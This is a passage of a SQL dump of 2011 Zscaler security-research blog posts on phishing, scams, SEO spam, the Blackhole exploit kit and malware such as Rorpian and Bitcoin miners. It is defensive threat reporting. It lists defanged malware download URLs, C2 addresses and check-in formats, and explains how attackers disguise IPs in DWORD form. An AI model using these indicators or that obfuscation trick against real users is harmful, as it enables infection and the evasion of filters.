domains were suspended by the registrar Dot.tk, and now redirect to to a parking domain where the registrar can make some money for it\'s free service with the advertising.\r\n\r\nThese domains are not harming users anymore, since they redirect to a harmless advertising page instead of a fake store. But it is disappointing that they are still in Google\'s index, and show up for queries related to buying software online. For example, Google displays more than 600 spam pages for the domain cetescawin.tk.\r\n\r\nThe second take away is that these dead domains illustrate why it is more effective for the spammers to hijack existing sites rather than create their own. With their own spam sites, it is very easy for both the registrar and Google to take down the entire domain, but is is not likely that Google, or any other search engine, or for example that the registrar Educause is going take down harvard.edu because some sub-domains of their sites contain spam.\r\n\r\nProtect yourself\r\n\r\nUsers can be warned when they visit a fake online store by installing the free Zscaler Safe Shopping add-on for Firefox, Safari, Chrome, Opera and Firefox Mobile.\r\n\r\n-- Julien', 'Phishing', 'https://www.zscaler.com/blogs/research/thousandsmillions-tk-sites-created-fake-online-stores');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (356, 'Facebook Free T-shirt Scams Take Advantage Of Email Upload', 'ThreatLabz', 'September 13, 2011', 'Attackers on Facebook are continually taking advantage of new ways to get their content onto a user’s wallpost, in order to further propagate their scams. Recently, we came across yet another interesting scam, this one offering a free official t-shirt as a gift on the occasion of Facebook’s 7th birthday celebration. At first, this scam looked like any other, but after further analysis I realized that this scam takes advantage of mobile email uploads. Facebook provides user’s with a unique email address as a convenient means of uploading content from mobile devices. Here is what the scam message looks like:        If you click on the link, you will be taken to a page offering the fake free t-shirts, as can be seen in the following screenshot:        The page provides a button to click for redeeming the t-shirt and also displays a counter showing how many additional shirts remain in stock. If you navigate the ‘Click Here’ button, you will be taken to the following page, which can be seen below:        Take a look at the instructions mentioned on the page. They instruct the victim to copy an email address which can be found at “www.facebook.com/mobile” and paste it into a field on the scam page, in order to verify that the user belongs to Facebook.    Mobile Upload:    When logged into Facebook, the email address displayed at www.facebook.com/mobile is a unique email address that a user can leverage to post status updates or send photos and videos straight to their profile. If someone has access to this email address, they can directly upload content to a user’s profile, without their knowledge. The Facebook mobile page displaying directions for using the unique email address can be seen below:        This is yet another trick used by scammers to gain access to your profile. Once a victim copies/pastes that email address, they will be taken to the page where the scam site will then ask them to complete surveys such as the one shown below:        The surveys represent the monetary component of the scam as the attackers are rewarded with a few cents every time a survey is completed. This is a common technique used in Facebook scams. The interesting component of this attack remains the social engineering used to obtain a victim’s personal email address, for uploading content from a mobile device. Once an attacker has that address, they have full write access to a victim’s profile and can use it to further propagate scams for monetary gain.    The cat and mouse game between Facebook and scammers continues. This time around, cleanup isn’t as simple as deleting a post from the victim’s profile. In this case, Facebook will have to force victims to change or reset affected email addresses to prevent further posts from the scammers.    Never share your personalized unique email address with anyone.    Umesh', 'Scam', 'https://www.zscaler.com/blogs/research/facebook-free-t-shirt-scams-take-advantage-email-upload');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (357, 'Firesheep And BlackSheep On Firefox 4.0+', 'Julien Sobrier', 'September 09, 2011', 'Firesheep    You may have noticed that the downloadable binary of the Firesheep add-on works only with version 3.6 of Firefox. The main branch is still incompatible with Firefox 6, but the latest Firesheep branch, (firefox5) remains very active and contributors are working toward making Firesheep compatible with newer versions of Firefox. I was able to compile this branch on Linux, but not on on Windows 7. Unfortunately, there were actually several changes in Firefox 4 that are incompatible with the original architecture and implementation of Firesheep.    New Add-on Manager    Firesheep calls the executable component firesheep-backend.exe (or firesheep-backend depending on the platform) which is packed with the add-on. To find the path of the executable, Firesheep needs to get information about the add-on through the add-on manager.    Firefox 4 introduced a new way to interact with the add-on manager and deprecated the previous one. The change is deeper than just calling a different function. Getting the path of the add-on now requires an asynchronous call instead of a synchronous function call. This can be a big change for most plugin architectures. Fortunately, Firesheep is very well structured and uses an event-driven architecture. This means that it can easily deal with asynchronous calls.    The Firesheep branch firefox4 fixes this issue (mostly in modules/Firesheep.js) in a way that is backward compatible with Firefox 3.6.    C++ XPCOM    While running firesheep-backend.exe, Firesheep needs to capture the output of the program. Natively, Firefox allows add-ons to run executables, but not to capture the output. Firesheep worked around this limitation by creating a custom XPCOM element in C++ that allows it to run executables and capture their output. In brief, XPCOM elements are cross-platform components that can be written in C++ and other languages. These components can interact with the platform (Windows, Linux, Mac OS X) and can be called through JavaScript inside the add-on.    There are several radical changes in Firefox 4.0 regarding XPCOM. First of all, you can see in the Firesheep compilation instructions, that the add-on must be compiled against Gecko 1.9.2. But Firefox 4 uses Gecko 2. This is a major version change which is not compatible with Gecko 1.9.2.    Among the changes required with Gecko 2 regarding custom XPCOM elements, the following are a problem for Firesheep:    	XPCOM elements must expose a new interface, so older XPCOM elements for Gecko 1.9.2 no longer work  	XPCOM elements must be recompiled for every new major release of Firefox. This is a maintenance headache with the new Firefox release scheme, where major versions are released every few months    This led Firesheep to change its back-end considerably. You can see these changes in the firefox5 branch. Firesheep dropped the custom XPCOM. It now uses the native Firefox objects to run the executable. The back-end writes its output directly to a temporary file and Firesheep tails the output.    As a result, the implementation of Firesheep is a bit more complex, but getting it to run on different platforms is easier. The new version of Firefox is compatible with OS X 64bit, which was not previously the case. It should also make it easier for Firesheep to work with newer versions of Firefox, because there is no longer a dependency on a custom XPCOM.    No binary release yet    Unfortunately, there is no binary release (the final XPI add-on) of the firefox5 branch available for users to download and install on Firefox. While I was able to compile it on Linux (32bit and 64bit) easily, I could not compile it on Windows (missing pcap-config, could not find my BOOST libraries, etc.). I\'ve spent several days trying to compile the different branches on Windows without any success.    BlackSheep    Because BlackSheep is largely based on the Firesheep source code, it suffers the exact same problem. I did not test BlackSheep thoroughly enough after Firefox 4 was released, so I did not realize BlackSheep no longer worked. I apologize to the users of BlackSheep.    I want to make BlackSheep available for Firefox 4 to 6. This should be possible by using the firefox5 branch of Firesheep, but I need to successfully compile this branch on Windows 7 first, which I have not been able to do despite my best efforts. I would be very grateful if a reader has a working Firesheep firefox5 version for Windows and could send it to me. I\'ll then be able to update BlackSheep and release it to the public.    -- Julien', 'Encryption', 'https://www.zscaler.com/blogs/research/firesheep-and-blacksheep-firefox-40');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (358, 'Fake Stores On Other Search Engines', 'Julien Sobrier', 'August 31, 2011', 'A few weeks ago, I showed that even search engines focused on eliminating spam from their search results fail to remove spam pages leading to fake online stores. I was curious to get a broader pictures of how different search engines deal with this issue. Since the fake stores exist in several languages (English, French, German, etc.), this issue affects web users in many countries.I decided to check how spam pages for \"Buy Windows 7 key\" (or its translation) are displayed in the first two pages (20 results) for various search engines. For reference, the numbers for the 3 main search engines in the US are:Google: 7 + 5 = 12  Bing: 5 + 5 = 10  Yahoo: 6 + 8 = 14  RussiaYandex: 10 + 10 = 20  Yandex contains a lot of blackhat spam in general, much more than Google and not just for fake stores. While Google has cleaned up search results for popular queries, especially spam leading to fake AV pages, I have seen no progress on Yandex.    Yandex shows only spam pages leading to fake stores in the first 2 pages  ChinaBaidu: 10 + 10 = 20  A lot of the spam pages are hosted on Chinese websites (for example):hxxp://nimende.com/notcjjff83/2011/08/29/ubuntu-10-04-lts-debut/  hxxp://bbs.52pk.com/thread-4913231-1-1.html  etc.      Spam pages and fake stores on Baidu  GermanyYahoo.de:  8 + 10 = 19  Bing.de: 7 + 10 = 17  Google.de: 0 + 2 = 2  Yahoo.de and Bing.de show very similar search results. The first result page shows mostly spam pages hosted on German sites, while the second pages contain spam in German languages on US .edu sites.    Yahoo.de gives worse results than the US site  Italy Google.it: 9 + 4 = 13 (only 4 search results on the second page)  Yahoo.it: 0      Italian spam pages on Google.it  Francevoila.fr: 0  google.fr: 2 + 10 = 12  Voila.fr and Google.fr give priority to web sites located in France. Most of the hijacked sites hosting spam are US University sites, hence they get a lower ranking.DuckDuckGoDuckDuckGo is a a one-man search engine that is gaining a lot of attention in the start up community. All results appear on the same page. Out of the first 20 results, 12 are spam pages.    The first 3 results on DuckDuckGo, all spam  As can be seen from the results, blackhat SEO spam is a global problem, not just one affecting the popular US based search engines. In fact, overall, the US seems to be in slightly better shape than some countriessuch as Russia, China and Germany that may not yet have suffered the same battle scars in this fight.-- Julien', 'Uncategorised', 'https://www.zscaler.com/blogs/research/fake-stores-other-search-engines');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (359, 'Blackhat Spam SEO Trends In 2011', 'Julien Sobrier', 'August 26, 2011', 'My last post on Blackhat SEO spam trends was posted in December 2010. Things have changed quite a bit in 2011.Cleaner results in popular searchesThe main target of search engine poisoning used to be popular searches found in the Google Hot Trends list. In several instances, popular searches contained up to 90% malicious links in the first ten pages. Currently, the number is between only one and three total malicious results in the first ten pages.Still, in July 2011, we identified 60 popular searches which contained at least one malicious spam link. They led to 35 different fake AV domains and three other domains serving different types of malware.Better protectionOne of the big changes in 2011 is that various players appear to be taking action much more quickly in stoping hijacked sites from infecting users. Google has cleaner results and hosting companies are in general, much faster at taking down malicious domains. Antivirus vendors also seem to have better protection for fake AV pages (the fact that these pages are changing very slowly must help).Webmasters seem to clean up their sites much faster as well. I believe that this is at least in part driven by better education as the threat of hijacked sites is now better known. Google has also helped to make webmasters aware of issues in their websites with warnings in Google Webmaster Tools, new warnings to users in search results and even direct e-mails to the owners of hijacked sites.As a result, the number of spam pages redirecting to a malicious sites that are either down or have been cleaned up has increased significantly.New targetsWhile the most popular searches are cleaner, a broader range of Google searches are now being poisoned. We recently demonstrated how Google News was redirecting users to malicious Java applets and Google Image search was poisoned for 6 months as well.Searches for buying software online remains 90% malicious, redirecting users to fake stores. There has been no significant improvement on that front, with 60 different fake store domains observed in July 2011. This is a problem that pretty much all search engines are facing.In total, I\'ve found over 1,000 spam search results leading to 150 different domains, most of them were malicious. This is a conservative number as I did not include malicious sites that were down (but were likely infecting users in the past) and malicious domains which prevented me from accessing their content.    Distribution of malicious domains per category  Fake AV is still thereAs you can see in the chart above, Fake AV sites are still present. They continue to look similar, both visually and in their source code. I\'ve spotted 35 different Fake AV domains in July 2011. The usual suspects were there: 10 co.cc sites (xyfybir.co.cc, wydrjim.co.cc, ttvzxiw.co.cc, etc.), 6 co.be (vrtwyqz.co.be, urtty.co.be, etc.), etc.    Fake AV page seen on 08/22/2011  Google has definitely made progress cleaning their search results and hosting companies have been doing their part as well. It has been some time since I have seen a mass Google Web search poisoning like the millions of  \"Hot Video\" pages that we observed last year. The only exception would be for searches related to malicious online software stores.I hope Google and other search engines vendors will continue to combat this threat.-- Julien', 'Malware', 'https://www.zscaler.com/blogs/research/blackhat-spam-seo-trends-2011');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (360, 'DNS Changes Lead To W32/Rorpian', 'ThreatLabz', 'August 23, 2011', 'Update:    Upon receiving additional file-system information from an infected host, the malware that resulted in being dropped was a TDSS variant, which corresponds to the earlier statement about Rorpian being used as a loader for TDSS. This was pulled from the MBR of the infected:         Executables:    MD5: 57eaccabfa387d51a29b12fb9f2451f1    V/T Report (29/44)         MD5: 73cfb1489b7949cfb9c76fc9c727fb58    V/T Report (26/44)         DLL:    MD5: 4f6ebfe892b1be6c40ea0895c5c51d21    V/T Report (9/44)    Note: the binary has debugging info enable, including reference to its PDB file:    H:\\atrohnwA\\gqybua\\ybgh\\qdyy.pdb    (possible phonetic strings - there are other such strings in the binary as well)         The original infection on this host occurred from exploitation of the LNK vulnerability, in order to execute a Rorpian payload:         MD5: 4e69a47a418b7af08f53effd0e8c61b7    V/T Report (28/44)              Original Post:    We\'ve had reports that some systems have had their DNS resolution settings modified to resolve domains from:         188.229.89.121         The IP belongs to a known \"bad\" /24 netblock in Romania, part of AS43134 (COMPLIFE-AS CompLife Ltd) ... a netblock that we had perviously noted within Scrapbook.         Which in effect, redirects all web browsing attempts to:         hxxp://188.229.89.121         Which presents a screen showing that you need to \"Update your browser\":           The image file and malware download viewable from my system linked to a placeholder \"update.browser.com\":      At least the attacker has a sense of humor :) the meta tag shows \"(C) Bank of Nkolai. Look I have a pen !\" -- this is in reference to this very funny awareness ad on cyber crime, see YouTube video.         The actual malware is live and downloadable from:         hxxp://188.229.89.121/X         A malware report related to this is viewable here:         MD5: 2dff3265278fb6a894829a75f6275c8a    V/T report: 28/44         The malware variant goes by many names: Rorpian, Buterat, Kolab, and SillyFDC. For ease, we\'ll just call it Rorpian -- which numerous sources describe it as a worm that spreads through network shares, exploits the .LNK vulnerability (MS10-046), and exploits a vulnerability (MS07-029) in DNS Server service (MS Encyclopedia entry). This worm can act as a loader for the TDSS rootkit (reference).         Further check-ins from the infected are made to the 188.229.89.121 c2 with the format:    /slog    &log=startum    &id=[ID number]    &os=[OS version]    &version=1d    &data=         Note: the User-Agent string used in the check-ins was:    Microsoft-WebDAV-MiniRedir/5.1.2600         There have been Internet reports of Mac and Ubuntu systems having this DNS change occurring within their /etc/resolv.conf ... however, this appears to just be a result of infected Windows systems that are setting DNS setting through DHCP for all devices on the network versus this malware infecting Mac/Ubuntu.', 'Malware', 'https://www.zscaler.com/blogs/research/dns-changes-lead-w32rorpian');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (361, 'Be Aware Of Gmail Phishing Pages', 'ThreatLabz', 'August 22, 2011', 'Phishing is certainly not a new attack vector but attackers are constantly using it to fool victims into entering sensitive information like authentication credentials. As I mentioned in a blog post a couple of years back, such attacks will never go away as phishing is a trivially easy attack vector that can be used to steal sensitive personal information. There are number of popular websites being targeted in phishing campaigns to steal sensitive information. Recently, we came across one website claiming to be a Gmail login page. Here is the screenshot of the website:             The above page is largely identical to a legitimate Gmail login page but there are a couple of important differences to be noted. The address of the website is not “www.gmail.com” but rather points to “hxxp://kphb2040.110mb.com/Photosnewmine.htm”. Additionally, the copyright notice is out of date.         If you enter your username and password, the entered data will be sent to a malicious server and you will then be redirected to the legitimate Gmail website. The attacker has done this intentionally so that a victim will assume that the initial login wasn’t successful and they must then re-enter their login credentials.         Even if you enter fake information, you will be redirected to legitimate Gmail site. For testing purposes, we have entered fake account information. The following packet capture illustrates the POST request:                  The victim’s email address and password has been sent to “input.php” and they are then redirected to the real “mail.gogle.com” website. There are plenty of such websites are present on the Internet and users should be cautious any time they are entering login credentials. Always check URL address before entering any sensitive information on a webpage. Instead of clicking on links, when possible manually enter the website address in the address bar.         Careful…         Umesh', 'Phishing', 'https://www.zscaler.com/blogs/research/be-aware-gmail-phishing-pages');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (362, 'Bitcoin Mining Malware', 'ThreatLabz', 'August 22, 2011', 'For those unfamiliar, Bitcoin is a digital P2P currency (here\'s a more detailed video explanation if interested) - people interact with it using locally or hosted \"wallet\" software.  It should not come as much of a surprise that malware has been designed to target abuse of this digital currency the same as any other (e.g., WoW Gold). Abuse can come in terms of theft and/or unauthorized Bitcoin mining - that is, solving computationally complex, \"proof-of-work\" problems (\"solving blocks\") to obtain a payout (based on an inflation algorithm).A Bitcoin account can be compromised if a computer with a wallet file can be remotely accessed by hackers or becomes infected by a virus or trojan. The first malware specifically targeting Bitcoin wallets was discovered June 16, 2011.  Current Bitcoin clients lack functionality for encrypting the wallet, however, the current development tree contains this feature and it will be available in the next release.[1]Recently, Symantec released a report on \"Trojan.Badminer\" - discovered 11 days ago, affecting most Windows systems that has the ability of running one of two Bitcoin mining programs depending on the infected host\'s configuration: Phoenix Miner (uses the system\'s GPU on graphics card) or RPC Miner -- the mined Bitcoins are then sent back to a location for the attacker to retrieve the generated currency.  When you think about it, this type of revenue generation is perfect for a botnet.It took me virtually no time at all to find a quick case study of such a malicious Bitcoin miner in our logs from yesterday.  Here is a live sample of one that we blocked:hxxp://img901.fileave.com/x8gp-on-59as.exeMD5: 8941ECF2586690701F0E748CCC954BB7Fortunately, it is detected by most A/V programs:Virustotal Report (26/44)The corresponding ThreatExpert report shows the malware connecting to 78.47.124.250 (belongs to Hetzner netblock) on port 8332 -- HTTP listener, assuming Botcoin dropzone.  Note: I doubt the ThreatExpert sandbox is able to process any of the code that would be designed to mine Bitcoins on the GPU. Further analysis of this particular sample shows that it makes its calls out to the domain: x.miners.in which does correspond to the previously mentioned IP in the ThreatExpert report.  A round-robin has been setup as follows to handle receipt of the Bitcoins:All of the IPs in the round-robin are to the Hetzner netblock - a great inexpensive hosting provider in Germany (sidenote: I recently tried to setup an account with them, and they required that I fax over a copy of my passport or drivers license for authenticity as part of their policy to prevent abuse - I did not want to share this and thus cancelled my account setup).Attempts to HTTP GET access the Bitcoin drop site show authentication required (likely for an admin console):Whereas, infected hosts do HTTP POST requests with the UserAgent strings like:Ufasoft bitcoin-miner/0.20 (Windows NT XP 5.1.2600 Service Pack 3)Ufasoft bitcoin-miner/0.20 (Windows NT 7 6.1.7600)The Ufasoft Bitcoin Miner (site) shows that it supports AMD/ATI, CUDA GPU (graphics card processor utilization)Obvious fake domain registration information provided to Name.com for registration of the miners.in domain:(microshits.us is a domain registered and hosted through gandi.net in France, registered to \"Dennis Timony\" in the US with billing to \"Gemblous Kim\" in Germany)Under the same fileave.com profile there are two PE executables with jpeg file extensions, possibly used in the same malware campaign:yavncc.jpegMD5: 291bfc99016ed4647862aeb896f741d1IRC Malware / injector (VT: 37/43)C2: 92.243.19.35  port: 1337yap.jpegMD5: a9c88a209db76deb4fe9f1a9f8f47971Palevo (VT: 27/43) While IRC-based malware and Palevo are older malware families, it looks as though the attacker is padding their portfolio of malware to include this newer, Bitcoin miner, form of revenue generation from their victims.Do a Google Search for Bitcoin miner in VirusTotal (Google dork) and you will see an influx of these varieties in late July through present.  If VirusTotal is any indicator, this certainly appears to be a growing trend (and convenient revenue stream for botherders).', 'Malware', 'https://www.zscaler.com/blogs/research/bitcoin-mining-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (363, 'The Pastebin Trend (cont.)', 'ThreatLabz', 'August 17, 2011', 'In June during some of the LulzSec pastes, I published a brief blog post on our sister blog (Scrapbook). In that post, I discussed a spike in Pastebin web transactions due to the LulzSec information drops and other controversial news within the information security community. To get a more precise view of when the spikes occurred, why and the general increase in Pastebin transactions, I wrote a script to automate the process of collecting daily statistics from our web transaction logs to Pastebin. Below are the results.\r\n \r\n\r\nFor Q2 2011 (April 1 - June 30), the a graph of the daily Pastebin usage looks like:\r\n\r\n\r\n\r\n\r\nYou can see from the trend-line that transactions to Pastebin increase about 200% throughout Q2. This increase has been due in part to some of the recent stories dealing with information being leaked out onto the Internet through Pastebin from LulzSec. However, surprisingly that was not the reason for the largest spike seen thus far - the reason for the significant spike on May 12 occurred due to privacy concerns surrounding Google\'s social networking site (see below for the link to the Pastebin paste). You can also see the cyclic-nature of the work week, since this traffic is from corporate, enterprise clients (i.e., the 2-day lulls are the weekends). The notable stories corresponding with the spikes seen in the above chart are as follows:\r\n\r\n	May 12-13: Google Social Circles privacy violation\r\n	June 13-15: LulzSec versus Bethesda & Senate.gov\r\n	June 20-22: LulzSec (UK Census and Operation Anti-Security) and Dropbox vulnerability disclosure\r\n	June 27: Dossier on LulzSec / gn0sis\r\n\r\nFollowing Q2, some of the LulzSec activity has settled down, so with the exception of two spikes in July, a slight overall decrease has been seen in recent Pastebin transactions versus Q2. This is what the July 1 to present chart looks like:\r\n\r\n\r\n\r\n\r\nThere are two prominent spikes during this timeframe:\r\n\r\n \r\n\r\n\r\n\r\n	July 1st: Anonymous / Lulz attacks against Arizona law enforcement (link1, link2)\r\n	July 21st: Anonymous / Lulz statement to FBI and law enforcement (link)\r\n\r\n\r\n\r\nA interesting side note - Pastebin changed it\'s IP from 173.236.52.197 to 184.154.125.14 on July 2nd - both are SingleHop netblocks (the DNS PTR record for the first IP is to m1221.sgded.com and the second is to s1.jeroenvader.com). The reason for doing this is unclear, perhaps it was an server upgrade.\r\n\r\n \r\n\r\nThere were many other Anonymous / Lulz Patebin pastes that occurred in the timeframe of this analysis -- I only listed pastes that were the cause for spikes seen within our customer traffic.\r\n\r\n \r\n\r\nThere is no question that the Anonymous / Lulz pastes to Pastebin increase the visits and traffic volume to the site ... driving factors for online revenue. One website revenue analysis site estimates that Pastebin receives about 7.3 million page views a day and has an estimated worth of almost $3 million USD based on this traffic volume. It is certainly interesting to witness this conflict of interest: Pastebin (and yes other web services like Twitter) are being used as popular soap boxes for illegally communicating sensitive / stolen information while at the same time collecting revenue from its related traffic. If Pastebin were to crack down hard on removing this content they would effectively be loosing their biggest cash cow. The Anonymous / Lulz pastes remain live on the Pastebin site -- if interested, here is Pastebin\'s acceptable use policy. One could argue that with the open avenue of communication that is the web, groups like Anonymous / Lulz would just use a different service or start their own so why bother cracking down, just collect the traffic (revenue) and be happy. Others would argue to do what is \"ethically right.\"', 'Analysis', 'https://www.zscaler.com/blogs/research/pastebin-trend-cont');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (364, 'Amusing Craigslist Phishing', 'Julien Sobrier', 'August 17, 2011', 'The best way to double check that the page you are visiting is a legitimate page and not a phishing site, is to verify the domain name in the address bar (obviously, this does not work in case of DNS hijacking). Phishers have used a variety of techniques to make the URL look legitimate, like using http://login:password@url.com with a login name that looks like a legitimate domain.I was amused when I saw a Craigslist phishing campaign last Friday. The phishing page ironically warns users about fake Craigslist pages. It tells people to always double check the URL before entering their credentials.    Craigslist phishing page claims to educate users on ... phishing sites!  If you didn\'t notice on the screenshot (click on the image to see it in its original size), the phishing page tells users to check the domain name at the end of the URL instead of the beginning.Indeed, the phishing page that I spotted used a URL ending with what looks like a legitimate domain name: hxxp://69.175.106.6/~feacosa1/nozit/accounts.craigslist.org/.The phisher is hiding the phishing page behind two other domains: URL shortener(s) redirect to different pages on free hosting sites which then redirect to the phishing page. It is a \"smart\" redirection in the sense that real users are redirected to the phishing page whereas URL shorteners are served with a regular page that looks legitimate. Even if the URL shorteners use a blacklist to prevent abuse, they cannot apply it on the real final destination.    Spam page to hide the phishing page from security tools  Here are some of the domains used for the redirection:npzut81.125mb.com  fdabbe61.batcave.net  pziut318.batcave.net  nipxuto11.125mb.com  hpasut81.tekcities.com    This brought to my attention the fact that in addition to telling my friends to always check the URL and the domain name, I should also remind them where the domain actually is! -- Julien', 'Uncategorised', 'https://www.zscaler.com/blogs/research/amusing-craigslist-phishing');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (365, 'The Web Has Still Not Switched To SSL-only', 'Julien Sobrier', 'August 11, 2011', 'In November 2010, the release of Firesheep highlighted the dangerous consequences of not using secure HTTPS transactions. Following this, I provided some of the reasons why the web has not switched to SSL-only yet. There have been some improvements since, notably Google+, which works only over HTTPS, and from Twitter.    But those are very small steps. A lot more needs to be done.    SSL by default    One trend involves offering HTTPS as a new option. Facebook and Twitter took this path. Unfortunately, the option is usually disabled by default. Half of the users do not understand what this option does and the other half is not aware of the new feature well hidden in their profile!       	  		  			  		  		  			HTTPS option under Security settings in Facebook  		  	      HTTPS should be enabled by default, perhaps with the option of disabling it for the very few users having problems with it.    Facebook    While Facebook has fixed the 2 bugs I mentioned in the earlier post - SSL: the sites which don\'t want to protect their users, it is practically impossible to use HTTPS on Facebook. The problem arises from the fact that the use of SSL breaks most of the applications I\'ve tried on the platform. I used to get error messages, now users are warned that they need to switch to HTTP. They have to logout, and login again, to get HTTPS back.       	  		  			  		  		  			Most Facebook Apps cannot be used with HTTPS  		  	    HTTPS cannot be used for popular applications like CityVille from Zynga. I doubt many users will take the hassle to logout/login constantly to switch back to SSL.      Insecure cookies    I\'ve seen HTTPS implemented incorrectly on many sites, including Facebook. The main purpose of HTTPS is to hide the user cookies, so that tools like Firesheep cannot be used to hijack a user session. That means the HTTPS cookie should never be sent over HTTP. There are two ways to achieve this:    	Use the secure keyword when sending a cookie with Set-Cookie. This mean the cookie can be sent by the client only over HTTPS  	Use a different sub-domain that support HTTPS only (like encrypted.google.com) and restrict the cookie to this sub-domain    Otherwise, when the user connects to the website over HTTP the user session is vulnerable. Unfortunately, Facebook uses the exact same cookie over HTTP and HTTPS, without securing it. If you type \"facebook.com\" in your address bar, you will send your cookie in clear text, even if you are then redirected to https://www.facebook.com/ and simply visiting a site that uses a Facebook widget, a Like button for example, leaks your user session in plain-text, even if you check the \"Secure (HTTPS)\" option in your profile. Nowadays, it is a challenge to not visit a website that does not contain any element from Facebook...       	  		  			  		  		  			My Facebook cookie leaked on a random web site (Like widget)  		  	      In the end, it does not really matter whether you use HTTPS or not for Facebook. Your Facebook cookie will be leaked when visiting other websites anyway.    Google    Google did the right thing with Google+. The website works with HTTPS only and there is no way to use HTTP. User cookies cannot be sent in clear text.    You can also use their search engine over HTTPS, unlike Bing, which does not offer a secure alternative.    But Google still has some work to do on the rest of their current web applications. For example, the Google Personal Home Page cannot be accessed over HTTPS (users get redirected to HTTP) and Adsense, the major adverting network, does not support HTTPS, which leads to a Mixed HTTP/HTTPS warning for sites would would like to use SSL.    Mobile    The situation is even worse in the mobile space. Most of the applications used on smartphones and tablets need to contact a web server to function: to retrieve advertising (Admob/Adsense Mobile), to get data from a web service, etc. But there is no way for the user to know whether sensitive information is sent over HTTP or HTTPS. There is no UI element equivalent to the lock shown in browsers and no visibility into the URLs. Researchers have illustrated that mobile developers cannot be trusted to secure communications, as all too often, they send user credentials in plain text.    While some websites have taken a few steps to protect the users, there is still a great deal to do. HTTPS should be enabled by default on all new web sites requiring user authentication. HTTPS should not just be required for login, it should also be required for all requests sent with a cookie.    -- Julien', 'Encryption', 'https://www.zscaler.com/blogs/research/web-has-still-not-switched-ssl-only');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (366, 'Blackhole Exploit Kit Continues It’s Dominance', 'ThreatLabz', 'August 06, 2011', 'Today, I was investigating a block that had been triggered on a webpage due to detection of the Blackhole exploit kit. We previously posted a blog about the rise in Blackhole exploit kit detections back in February, 2011. That blog post continues to receive comments from readers who have identified similar attacks and I regularly receive email from readers requesting analysis on Blackhole exploit kit samples. The Blackhole exploit kit is often behind the injection of malicious Iframes in legitimate websites.         Interestingly, attackers are not only using heavy obfuscation but they also hide the obfuscated Iframes inside HTML body tags. Here is the source of the infected website page which I analyzed this morning:                  The heavily obfuscated code has been injected in the HTML body tag. You need to format the code and do some manual analysis to find the malicious URL. In order to do so, you can follow the trick mentioned in my earlier blog for de-obfuscating the malicious content. The formatted code looks like:                  Basically, the above malicious code creates two Iframes pointing to two different malicious websites serving Blackhole exploit kit code. To decode, insert an “alert()” function as described in an earlier blog where it concatenates the various strings. You can then see the malicious URL’s, such as:                  The URL syntax “/index.php?tp=” suggests that the links are related to Blackhole exploit kit. Once visited, the malicious websites return heavily obfuscated exploit code which exploits different vulnerabilities and downloads malicious binaries. Here is what the exploit code looks like:                  The above code exploits various older vulnerabilities. Due to the obfuscation used in both the Iframe and exploit, overall AV detection remains very poor. Here is the VirusTotal result for the exploit code. This example shows that the Blackhole exploit kit continues to evolve with different tricks and obfuscation techniques.         Definitely Badhole!!!         Umesh', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/blackhole-exploit-kit-continues-its-dominance');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (367, 'Malicious URL’s Using DWORD Formatted IP Addresses', 'ThreatLabz', 'August 03, 2011', 'IP stands for Internet Protocol. An IP address is numerical label assigned to each device on the network and every website has a unique IP addresses to identify the site on the Internet. As an IP address is difficult to remember host/domain names are used and translated to an IP address via DNS. What some people don’t realize is that an IP address can be presented in many formats such as host/domain name, dotted decimal IP address or DWORD format. Most of the browsers are accepting only hostnames and decimal dotted IP addresses and rest of them are ignored nowadays.\r\n\r\n \r\n\r\nIn our research, we have identified that attackers have started using malicious domains in DWORD format to fool or confuse victims. Here is the example of such malicious URL:\r\n\r\n \r\n\r\nhxxp://1539393606/GoogleSearch.class\r\n\r\n \r\n\r\nIf you look at the above URL, you will see an atypical number instead of a domain name or IP address. But careful, it is actually an IP address which has been converted by the attacker into DWORD format. If you visit above URL, your browser will automatically convert this to a plain IP address. Lately, we have been seeing many malicious URL’s using the DWORD format to hide their actual IP address. The number “1539393606” is actually an IP address which points to “91.193.72.70”. If you visit above URL using browser like Firefox, it will display the URL as “http://91.193.72.70/GoogleSearch.class”.\r\n\r\n \r\n\r\nIP to DWORD format\r\n\r\n \r\n\r\nTo convert an IP address to DWORD, open your calculator in scientific mode. Let’s take the above IP address, which is “91.193.72.70”. Split the IP address into four octets - 91, 193, 72 and 70.\r\n\r\n1) Select decimal mode and type 91 in your calculator.\r\n2) Then click on HEX mode. It will give you hex value 5B for first octet. Write that down and do the same for the other three octets.\r\n3) You will ultimately get “5BC14846” for all 4 octets.\r\n4) The string above is in hex format. Select HEX mode in the calculator and copy paste the hex string.\r\n5) Select decimal mode and you will then get “1539393606” which is the DWORD form of the IP address.\r\n6) Type this DWORD in your browser and you will be taken to address “91.193.72.70”.\r\n\r\n \r\n\r\n \r\n\r\nHere are some other malicious URL’s we have seen in the wild in DWORD format:\r\n\r\n \r\n\r\nhxxp://1496251283/dhj8v.class\r\n\r\n \r\n\r\nhxxp://3560666344/options.class\r\n\r\n \r\n\r\nFurther research shows that these URL’s are exploiting Java vulnerability (CVE-2010-4452) to download malware onto the victim machine. \r\n\r\n \r\n\r\nWhat’s your DWORD form?\r\n\r\n \r\n\r\nUmesh', 'Evasion/Stealth', 'https://www.zscaler.com/blogs/research/malicious-urls-using-dword-formatted-ip-addresses');
